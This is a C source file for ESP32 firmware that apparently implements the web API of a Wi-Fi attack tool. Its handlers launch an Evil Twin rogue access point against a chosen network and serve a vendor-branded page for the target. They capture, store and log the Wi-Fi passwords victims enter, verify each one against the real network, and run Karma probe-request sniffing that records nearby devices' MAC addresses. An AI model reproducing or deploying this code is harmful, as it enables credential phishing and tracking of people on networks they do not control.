#include <string.h>
#include <esp_timer.h>
#include <esp_log.h>
#include <cJSON.h>
#include "utils.h"
#include "config.h"
#include "evil_twin.h"
#include "karma_attack.h"
#include "server_api.h"
#include "passwordMng.h"
#include "vendors.h"
#include "target.h"
#include "nvs_keys.h"

static const char *TAG = "SERVER_API";

typedef struct {
    api_commant_t cmd;
    esp_err_t (*handler)(ws_frame_req_t *req);
} api_cmd_t;


const char* mime_from_path(const char* path) {
    if (strstr(path, ".html")) return "text/html";
    if (strstr(path, ".css"))  return "text/css";
    if (strstr(path, ".js"))   return "application/javascript";
    if (strstr(path, ".png"))  return "image/png";
    if (strstr(path, ".jpg"))  return "image/jpeg";
    if (strstr(path, ".ico"))  return "image/x-icon";
    if (strstr(path, ".svg"))  return "image/svg+xml";
    return "text/plain";
}


static esp_err_t evil_twin_handler(httpd_req_t *req) 
{
    char buffer[300];
    unsigned int auth_tmp = 0;
    int ret = httpd_req_recv(req, buffer, sizeof(buffer) - 1);
    if (ret <= 0) {
        if (ret == HTTPD_SOCK_ERR_TIMEOUT) {
            httpd_resp_send_408(req);
        }
        return ESP_FAIL;
    }
    buffer[ret] = '\0';
    char bssid[64] = {0};
    target_info_t target_info = { 0 };
    sscanf(buffer,"ssid=%32[^&]&bssid=%17[^&]&channel=%hhu&signal=%hhd&authmode_code=%u&group=%hhu&pairwise=%hhu&scheme=%hhd", 
    target_info.ssid, bssid, &target_info.channel, &target_info.rssi, &auth_tmp, (unsigned char *)&target_info.group_cipher, (unsigned char *)&target_info.pairwise_cipher, &target_info.attack_scheme);

    target_info.authmode = (wifi_auth_mode_t)auth_tmp;
    ESP_LOGI(TAG, "Starting Evil Twin attack on SSID: %s, BSSID: %s, Channel: %d, Signal: %d, Authmode: %s",
             target_info.ssid, bssid, target_info.channel, target_info.rssi, authmode_to_str(target_info.authmode));

    if (sscanf(bssid, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &target_info.bssid[0], &target_info.bssid[1], &target_info.bssid[2],
               &target_info.bssid[3], &target_info.bssid[4], &target_info.bssid[5]) != 6) {
        ESP_LOGE(TAG, "Errore nel parsing del BSSID\n");
        return ESP_FAIL;
    }

    httpd_resp_sendstr(req, "EvilTwin attack is started, this page will no longer be enabled until device reset.");
    httpd_resp_send(req, NULL, 0);

    /* Start evil twin attack */
    evil_twin_start_attack(&target_info);

    return ESP_OK;
}


static esp_err_t get_password_handler(httpd_req_t *req) 
{
    password_manager_read_passwords(req);
    return ESP_OK;
}


static esp_err_t get_evlitwin_target_handler(httpd_req_t *req)
{
    target_info_t *target = target_get(TARGET_INFO_EVIL_TWIN);

    /* Logo path */
    char path[64];
    strlcpy(path, "/logo/", sizeof(path));
    strlcat(path, vendorToString(target->vendor), sizeof(path));
    strlcat(path, ".png", sizeof(path));

    cJSON *root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, "logo", path);
    cJSON_AddStringToObject(root, "ssid", (const char*)target->ssid);
    cJSON_AddStringToObject(root, "vendor", vendorToString(target->vendor));
    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (!json_response) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "JSON alloc failed");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, json_response, HTTPD_RESP_USE_STRLEN);
    free(json_response);
    return ESP_OK;
}


static void shutdown_task(void *pvParameter)
{
    vTaskDelay(pdMS_TO_TICKS(1000));
    evil_twin_stop_attack();

    /* Enter in deep sleep to preserve battery power */
    /* Only hardware wakeup (Reset button) */
    //esp_deep_sleep_start();

    vTaskDelete(NULL);
}


static esp_err_t check_input_password_handler(httpd_req_t *req)
{
    target_info_t *target = target_get(TARGET_INFO_EVIL_TWIN);

	char buffer[256] = { 0 };
    int ret = 0;

    ret = httpd_req_recv(req, buffer, sizeof(buffer) - 1);
    if (ret <= 0) {
        if (ret == HTTPD_SOCK_ERR_TIMEOUT) {
            httpd_resp_send_408(req);
        }
        return ESP_FAIL;
    }

	char password[64] = { 0 };
    sscanf(buffer, "password=%63[^&]", password);

	/* Save password */
	memset(&buffer, 0, sizeof(buffer));
	snprintf(buffer, sizeof(buffer), "%s,%02X:%02X:%02X:%02X:%02X:%02X,%s", (const char *)target->ssid, target->bssid[0], target->bssid[1], target->bssid[2], target->bssid[3], target->bssid[4], target->bssid[5], password);
	password_manager_save(buffer);
	ESP_LOGI(TAG, "Password saved: %s", buffer);

	/* Check password and send response */
	if( evil_twin_check_password(password) == true )
	{
		httpd_resp_send(req, "ok", HTTPD_RESP_USE_STRLEN);
		httpd_resp_send(req, NULL, 0);

        /* Stop attack and restore */
        xTaskCreate(shutdown_task, "shutdown_task", 4096, NULL, 5, NULL);
	}
	else
	{
		httpd_resp_send(req, "bad", HTTPD_RESP_USE_STRLEN);
		httpd_resp_send(req, NULL, 0);
	}
	return ESP_OK;
}


static esp_err_t karma_attack_scan_handler(httpd_req_t *req)
{
    char buffer[16];
    int ret = httpd_req_recv(req, buffer, sizeof(buffer) - 1);
    if (ret <= 0) {
        if (ret == HTTPD_SOCK_ERR_TIMEOUT) {
            httpd_resp_send_408(req);
        }
        return ESP_FAIL;
    }
    buffer[ret] = '\0';
    uint8_t start_stop = 0;
    sscanf(buffer,"start_stop=%hhd", &start_stop);

    if(start_stop == 1)
    {
        karma_attack_probes_scan_start();
        httpd_resp_sendstr(req, "Karma attack probe scan started.");
    }
    else if(start_stop == 0)
    {
        karma_attack_probes_scan_stop();
        httpd_resp_sendstr(req, "Karma attack probe scan stopped.");
    }
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}


static esp_err_t http_get_karma_probes_handler(httpd_req_t *req)
{
    const probe_request_list_t *list = wifi_sniffer_get_captured_probes();
    
    if (list == NULL) {
        httpd_resp_send_500(req);
        return ESP_FAIL;
    }

    cJSON *root = cJSON_CreateArray();
    for (int i = 0; i < list->num_probes; i++) 
    {
        cJSON *item = cJSON_CreateObject();
        char mac_str[18];
        snprintf(mac_str, sizeof(mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
                 list->probes[i].mac[0], list->probes[i].mac[1], list->probes[i].mac[2],
                 list->probes[i].mac[3], list->probes[i].mac[4], list->probes[i].mac[5]);

        cJSON_AddStringToObject(item, "mac", mac_str);
        cJSON_AddStringToObject(item, "ssid", list->probes[i].ssid);
        cJSON_AddNumberToObject(item, "rssi", list->probes[i].rssi);
        cJSON_AddNumberToObject(item, "channel", list->probes[i].channel);
        cJSON_AddItemToArray(root, item);
    }
    char *json_string = cJSON_PrintUnformatted(root);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, json_string, strlen(json_string));

    free(json_string);
    cJSON_Delete(root);
    return ESP_OK;
}


static esp_err_t karma_attack_set_target_handler(httpd_req_t *req) 
{
    char buffer[300];
    int ret = httpd_req_recv(req, buffer, sizeof(buffer) - 1);
    if (ret <= 0) {
        if (ret == HTTPD_SOCK_ERR_TIMEOUT) {
            httpd_resp_send_408(req);
        }
        return ESP_FAIL;
    }
    buffer[ret] = '\0';
    target_info_t target_info = { 0 };
    sscanf(buffer,"ssid=%32[^&]&channel=%hhu&scheme=%hhd", 
    target_info.ssid, &target_info.channel, &target_info.attack_scheme);

    httpd_resp_sendstr(req, "Karma target selected.");
    httpd_resp_send(req, NULL, 0);

    /* Set karma attack target */
    karma_attack_set_target(&target_info);

    return ESP_OK;
}


esp_err_t register_server_api_handlers(httpd_handle_t server)
{
    /* Handler for starting evil twin attack */
    httpd_uri_t evil_twin_uri = {
        .uri = "/api/evil_twin",
        .method = HTTP_POST,
        .handler = evil_twin_handler,
        .user_ctx = NULL
    };
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &evil_twin_uri));

    /* Get saved password */
    httpd_uri_t get_password_uri = {
        .uri = "/get_passwords",
        .method = HTTP_POST,
        .handler = get_password_handler,
        .user_ctx = NULL
    };
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &get_password_uri));

    /* Get vendor string */
    httpd_uri_t get_evlitwin_target = {
        .uri = "/api/get_evlitwin_target",
        .method = HTTP_GET,
        .handler = get_evlitwin_target_handler,
        .user_ctx = NULL
    };
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &get_evlitwin_target));

    /* Get vendor string */
    httpd_uri_t check_input_password = {
        .uri = "/api/check_input_password",
        .method = HTTP_POST,
        .handler = check_input_password_handler,
        .user_ctx = NULL
    };
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &check_input_password));

    /* Start karma attack scan probes */
    httpd_uri_t karma_attack_scan = {
        .uri = "/api/karma_attack/scan",
        .method = HTTP_POST,
        .handler = karma_attack_scan_handler,
        .user_ctx = NULL
    };
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &karma_attack_scan));

    /* URI configuration for getting karma probes */
    httpd_uri_t karma_probes_uri = {
        .uri       = "/api/karma_attack/get_probes",
        .method    = HTTP_GET,
        .handler   = http_get_karma_probes_handler,
        .user_ctx  = NULL
    };
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &karma_probes_uri));

    /* Set karma attack target */
    httpd_uri_t karma_attack_set_target_uri = {
        .uri = "/api/karma_attack/set_target",
        .method = HTTP_POST,
        .handler = karma_attack_set_target_handler,
        .user_ctx = NULL
    };
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &karma_attack_set_target_uri));

    return ESP_OK;
}

//############################################ NEW WEB SOCKETS API HANDLERS ############################################
static void api_send_status_frame(ws_frame_req_t *req, const char* status, const char *message)
{
    cJSON *root = cJSON_CreateObject();
    if (root == NULL) return;

    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "status", status);
    cJSON_AddStringToObject(root, "message", message);

    char *payload = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (payload == NULL) return;

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = payload;
    cmd.len = strlen(payload);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        free(payload);
    }
}


static esp_err_t api_get_status(ws_frame_req_t *req)
{
    int64_t time_us = esp_timer_get_time();
    int64_t time_s = time_us / 1000000;
    int hours = time_s / 3600;
    int minutes = (time_s % 3600) / 60;
    int seconds = time_s % 60;
    char uptime_str[16];
    snprintf(uptime_str, sizeof(uptime_str), "%02d:%02d:%02d", hours, minutes, seconds);

    /* Get RAM Usage percentage */
    size_t total_ram = heap_caps_get_total_size(MALLOC_CAP_DEFAULT);
    size_t free_ram = heap_caps_get_free_size(MALLOC_CAP_DEFAULT);
    int ram_usage = 0;
    if (total_ram > 0) {
        ram_usage = 100 - ((free_ram * 100) / total_ram);
    }

    cJSON *root = cJSON_CreateObject();
    if (root == NULL) {
        return ESP_FAIL;
    }
    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "type", "get_status");
    cJSON_AddStringToObject(root, "uptime", uptime_str);
    cJSON_AddNumberToObject(root, "ram", ram_usage);
    cJSON_AddNumberToObject(root, "packets", 0);
    cJSON_AddBoolToObject(root, "sd", false);
    bool attack_running = false;
    cJSON_AddBoolToObject(root, "evil_twin_running", attack_running);

    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (json_response == NULL) {
        return ESP_FAIL;
    }

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json_response;
    cmd.len = strlen(json_response);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        free(json_response);
        return ESP_FAIL;
    }
    
    return ESP_OK;
}


static esp_err_t api_admin_get_ap_settings(ws_frame_req_t *req) 
{
    char ssid[32] = {0};
    char password[64] = {0};
    int32_t channel = 1;

    /* Read value from flash */
    if( read_string_from_flash("wifi_ssid", ssid) != ESP_OK )
    {
        strcpy(ssid, DEFAULT_WIFI_SSID);
    }
    if( read_string_from_flash("wifi_pass", password) != ESP_OK )
    {
        strcpy(password, DEFAULT_WIFI_PASS);
    }
    if( read_int_from_flash("wifi_chan", &channel) != ESP_OK )
    {
        channel = DEFAULT_WIFI_CHAN;
    }

    cJSON *root = cJSON_CreateObject();
    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "type", "get_ap_settings");
    cJSON_AddStringToObject(root, "ssid", ssid);
    cJSON_AddStringToObject(root, "password", password);
    cJSON_AddNumberToObject(root, "channel", channel);

    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (!json_response) {
        return ESP_FAIL;
    }

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json_response;
    cmd.len = strlen(json_response);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        free(json_response);
        return ESP_FAIL;
    }

    return ESP_OK;
}


static esp_err_t api_admin_set_ap_settings(ws_frame_req_t *req)
{
    //TODO: Check input values befose saving
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) {
        ESP_LOGE(TAG, "Invalid JSON received");
        return ESP_FAIL;
    }
    const cJSON *j_ssid = cJSON_GetObjectItemCaseSensitive(json, "ssid");
    const cJSON *j_password = cJSON_GetObjectItemCaseSensitive(json, "password");
    const cJSON *j_channel = cJSON_GetObjectItemCaseSensitive(json, "channel");

    char ssid[32] = {0};
    char password[64] = {0};
    int channel = 1;

    if (cJSON_IsString(j_ssid)) {
        strlcpy(ssid, j_ssid->valuestring, sizeof(ssid));
    }
    if (cJSON_IsString(j_password)) {
        strlcpy(password, j_password->valuestring, sizeof(password));
    }
    if (cJSON_IsNumber(j_channel)) {
        channel = j_channel->valueint;
    }
    cJSON_Delete(json);

    save_string_to_flash(WIFI_SSID_KEY, (const char *)ssid);
    save_string_to_flash(WIFI_PASS_KEY, (const char *)password);
    save_int_to_flash(WIFI_CHAN_KEY, channel);

    api_send_status_frame(req, "ok", "AP settings saved successfully.");

    return ESP_OK;
}


static esp_err_t api_wifi_scan(ws_frame_req_t *req)
{
    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = false,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time.active.min = 100,
        .scan_time.active.max = 300,
        .home_chan_dwell_time = 100,
    };

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.frame_type = WS_TX_FRAME;

    esp_err_t err = esp_wifi_scan_start(&scan_config, true);
    if (err != ESP_OK) {
        api_send_status_frame(req, "error", "Failed to start scan");
        return err;
    }

    uint16_t ap_count = 0;
    err = esp_wifi_scan_get_ap_num(&ap_count);
    if (err != ESP_OK) {
        api_send_status_frame(req, "error", "Failed to get AP count");
        return err;
    }

    wifi_ap_record_t *ap_records = NULL;
    if (ap_count > 0) {
        ap_records = (wifi_ap_record_t *)calloc(ap_count, sizeof(wifi_ap_record_t));
        if (!ap_records) {
            api_send_status_frame(req, "error", "Out of memory");
            return ESP_ERR_NO_MEM;
        }

        err = esp_wifi_scan_get_ap_records(&ap_count, ap_records);
        if (err != ESP_OK) {
            free(ap_records);
            api_send_status_frame(req, "error", "Failed to get AP records");
            return err;
        }
    }

    cJSON *response_obj = cJSON_CreateObject();
    cJSON_AddNumberToObject(response_obj, "req_id", req->req_id);
    cJSON_AddStringToObject(response_obj, "type", "scan_result");

    cJSON *root = cJSON_CreateArray();
    if (!root) {
        free(ap_records);
        api_send_status_frame(req, "error", "cJSON_CreateArray failed");
        return ESP_ERR_NO_MEM;
    }

    for (int i = 0; i < ap_count; i++) {
        char ssid[33];
        memcpy(ssid, ap_records[i].ssid, sizeof(ap_records[i].ssid));
        ssid[32] = '\0';

        char bssid[18];
        snprintf(bssid, sizeof(bssid),
                 "%02X:%02X:%02X:%02X:%02X:%02X",
                 ap_records[i].bssid[0], ap_records[i].bssid[1], ap_records[i].bssid[2],
                 ap_records[i].bssid[3], ap_records[i].bssid[4], ap_records[i].bssid[5]);

        cJSON *obj = cJSON_CreateObject();
        if (!obj) {
            cJSON_Delete(root);
            free(ap_records);
            api_send_status_frame(req, "error", "cJSON_CreateObject failed");
            return ESP_ERR_NO_MEM;
        }

        cJSON_AddStringToObject(obj, "ssid", ssid);
        cJSON_AddNumberToObject(obj, "signal", ap_records[i].rssi);
        cJSON_AddNumberToObject(obj, "channel", ap_records[i].primary);
        cJSON_AddStringToObject(obj, "bssid", bssid);
        cJSON_AddStringToObject(obj, "authmode", authmode_to_str(ap_records[i].authmode));
        cJSON_AddNumberToObject(obj, "authmode_code", ap_records[i].authmode);
        cJSON_AddNumberToObject(obj, "pairwise_cipher", ap_records[i].pairwise_cipher);
        cJSON_AddNumberToObject(obj, "group_cipher", ap_records[i].group_cipher);
        cJSON_AddBoolToObject(obj, "wps", ap_records[i].wps ? 1 : 0);
        cJSON_AddItemToArray(root, obj);
    }
    cJSON_AddItemToObject(response_obj, "data", root);

    char *json = cJSON_PrintUnformatted(response_obj);
    if (ap_records) free(ap_records);
    cJSON_Delete(response_obj);

    if (!json) {
        return ESP_ERR_NO_MEM;
    }

    cmd.payload = json; 
    cmd.len = strlen(json);
    cmd.need_free = true;

    if(ws_send_command_to_queue(&cmd) != ESP_OK) {
        free(json);
        ESP_LOGE(TAG, "Queue full");
        return ESP_FAIL;
    }

    return ESP_OK;
}


static const api_cmd_t api_cmd_list[] = {
    { API_GET_STATUS, api_get_status },
    { API_SET_AP_SETTINGS, api_admin_set_ap_settings },
    { API_GET_AP_SETTINGS, api_admin_get_ap_settings },
    { API_WIFI_SCAN, api_wifi_scan },
    // { API_START_EVILTWIN, evil_twin_handler },
    // { API_GET_EVILTWIN_TARGET, get_evlitwin_target_handler },
    // { API_CHECK_INPUT_PASSWORD, check_input_password_handler },
    // { API_GET_PASSWORDS, get_password_handler },
};


void http_api_parse(ws_frame_req_t *req)
{
    cJSON *root = cJSON_Parse(req->payload);
    if (root == NULL) {
        ESP_LOGE(TAG, "Invalid JSON received");
        return;
    }

    cJSON *jcmd = cJSON_GetObjectItemCaseSensitive(root, "cmd");
    if (!cJSON_IsNumber(jcmd)) {
        ESP_LOGE(TAG, "Missing/invalid cmd");
        cJSON_Delete(root);
        return;
    }

    cJSON *jid = cJSON_GetObjectItemCaseSensitive(root, "req_id");
    if (cJSON_IsNumber(jid)) {
        req->req_id = jid->valueint; 
    } else {
        req->req_id = 0;
    }

    int cmd = jcmd->valueint;
    for (size_t i = 0; i < sizeof(api_cmd_list) / sizeof(api_cmd_t); i++) {
        if (api_cmd_list[i].cmd == cmd) {
            api_cmd_list[i].handler(req);
            break;
        }
    }
    cJSON_Delete(root);
}